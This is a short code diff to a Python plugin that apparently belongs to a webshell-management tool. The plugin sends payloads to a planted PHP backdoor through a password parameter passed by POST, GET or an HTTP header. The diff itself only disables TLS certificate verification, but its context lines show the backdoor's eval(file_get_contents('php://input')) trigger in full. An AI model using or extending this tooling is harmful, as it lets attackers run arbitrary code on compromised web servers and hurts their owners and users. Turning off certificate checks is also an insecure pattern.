@@ -4,6 +4,8 @@ import requests
 from api import Plugin, Session, CodeExecutor, ServerInfo, OSType, Command, SessionType, logger, utils, SessionOptions
 import json, base64, re
 import traceback
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def get_plugin_class():
@@ -96,13 +98,13 @@ class AdvancedExecutor(Plugin, CodeExecutor):
         try:
             if pwd_type == 'POST':
                 ret = self.request.post(url, data={pwd:payload}, timeout=timeout, 
-                    proxies=proxies).content
+                    proxies=proxies, verify=False).content
             elif pwd_type == 'GET':
                 ret = self.request.get(url, params={pwd:'@eval(file_get_contents("php://input"));'},data=payload, timeout=timeout,
-                    proxies=proxies).content
+                    proxies=proxies, verify=False).content
             elif pwd_type == 'HEADER':
                 ret = self.request.get(url, headers={pwd.upper():'@eval(file_get_contents("php://input"));'},data=payload, timeout=timeout,
-                    proxies=proxies).content
+                    proxies=proxies, verify=False).content
             else:
                 logger.error(f"错误的密码类型，密码类型只能是POST、GET和HEADER！")
         except Exception as e:
